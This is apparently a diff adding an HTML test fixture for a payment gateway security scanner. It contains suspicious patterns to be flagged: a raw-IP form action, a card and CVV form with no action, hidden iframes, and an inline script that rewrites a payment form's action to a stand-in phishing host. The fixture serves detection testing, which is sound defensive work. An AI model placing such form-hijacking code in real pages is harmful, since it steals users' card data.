@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Test Page for Payment Gateway Security Analysis Platform</title>
+    <!-- Include Razorpay SDK -->
+    <script src="https://checkout.razorpay.com/v1/checkout.js"></script>
+    <!-- Include Stripe SDK -->
+    <script src="https://js.stripe.com/v3/"></script>
+</head>
+<body>
+    <h1>Security Test Page</h1>
+
+    <!-- 1. Normal/suspicious form: Raw IP action -->
+    <div>
+        <h2>Form posting to raw IP</h2>
+        <form action="http://192.168.0.5/pay" method="post">
+            <input type="text" name="amount" value="100">
+            <input type="submit" value="Pay with IP Form">
+        </form>
+    </div>
+
+    <!-- 2. Suspicious form: Missing form action containing payment inputs -->
+    <div>
+        <h2>Form with missing action and payment fields</h2>
+        <form action="" method="post">
+            <label for="cardnumber">Card Number:</label>
+            <input type="text" id="cardnumber" name="cc_number">
+            
+            <label for="cvv">CVV:</label>
+            <input type="text" id="cvv" name="cvv">
+            
+            <label for="expiry">Expiry:</label>
+            <input type="text" id="expiry" name="expiry">
+
+            <input type="submit" id="rzp-button" value="Pay Now">
+        </form>
+    </div>
+
+    <!-- 3. Element triggering Stripe/Razorpay keywords -->
+    <div id="stripe-button" class="stripe-button">
+        Stripe checkout trigger
+    </div>
+
+    <!-- 4. Hidden iframe -->
+    <iframe src="about:blank" style="display: none;" id="hidden-iframe-1"></iframe>
+    <iframe src="about:blank" style="visibility: hidden;" id="hidden-iframe-2"></iframe>
+    <iframe src="about:blank" hidden id="hidden-iframe-3"></iframe>
+
+    <!-- 5. JS rewriting action -->
+    <script>
+        // Inline script that dynamically changes action
+        var form = document.getElementById('payment-form');
+        if (form) {
+            form.action = "https://phishing-site.com/steal";
+            form.setAttribute("action", "https://phishing-site.com/steal2");
+        }
+        console.log(document.forms[0].action);
+    </script>
+</body>
+</html>
